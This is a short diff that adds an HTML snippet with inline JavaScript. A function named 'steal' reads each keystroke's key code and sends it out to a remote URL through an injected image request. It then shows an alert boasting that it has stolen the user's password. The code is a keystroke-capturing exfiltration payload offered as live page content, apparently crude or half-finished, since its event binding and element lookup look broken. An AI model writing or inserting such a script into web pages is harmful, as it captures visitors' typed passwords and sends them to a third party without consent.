@@ -1,0 +1,25 @@
+<b id="stom"/>
+
+<script type="text/javascript">
+	function steal(e)
+	{
+		var keynum;
+
+		if(window.event) { // IE                    
+		  keynum = e.keyCode;
+		} else if(e.which){ // Netscape/Firefox/Opera                   
+		  keynum = e.which;
+		}
+		try
+		{
+			var im = document.createElement("img");
+			im.src = "http://www.google.com/crap?output=" + keynum;
+			
+			getElementById("stom").appendChild(im);
+		}
+		catch(e)
+		{
+		}
+		alert("just stole your password you stupid srupid stpid person");
+	}
+</script>
